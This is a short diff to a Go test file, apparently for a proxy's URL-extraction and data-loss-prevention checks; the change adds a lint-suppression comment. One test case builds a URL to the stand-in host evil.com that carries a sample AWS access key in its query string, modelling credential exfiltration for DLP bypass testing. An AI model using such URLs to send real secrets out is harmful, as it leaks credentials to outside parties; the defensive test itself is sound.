@@ -2132,7 +2132,7 @@ func TestExtractTargetURL_UnencodedAmpersand(t *testing.T) {
 			rawQuery: "agent=bot&url=https://example.com/?x=1&y=2",
 			want:     "https://example.com/?x=1&y=2",
 		},
-		{
+		{ //nolint:gosec // G101: test credential for DLP bypass verification
 			name:     "secret after ampersand bypasses DLP",
 			rawQuery: "url=https://evil.com/?data=ok&k=" + "AKIA" + "IOSFODNN7EXAMPLE", //nolint:gosec // G101: test credential, built at runtime
 			want:     "https://evil.com/?data=ok&k=" + "AKIA" + "IOSFODNN7EXAMPLE",     //nolint:gosec // G101: test credential, built at runtime
